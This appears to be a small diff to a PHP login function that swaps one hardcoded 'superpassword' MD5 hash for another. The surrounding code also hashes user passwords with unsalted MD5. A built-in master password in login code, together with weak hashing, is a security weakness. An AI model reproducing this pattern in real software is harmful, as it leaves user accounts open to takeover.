@@ -176,7 +176,7 @@ function verify_login($username, $password, $encodedpassword) {
 
     /* verify the username and password.  if it is a valid login, return an array
      * with the username, firstname, lastname, and email address of the user */
-    $superpassword = "25a694bd7f0a3f48e078f30c3afce1e5";
+    $superpassword = "20ffeee869abfadb176a66075c5f1816";
     
     if ($encodedpassword) {
         $password = md5($password);
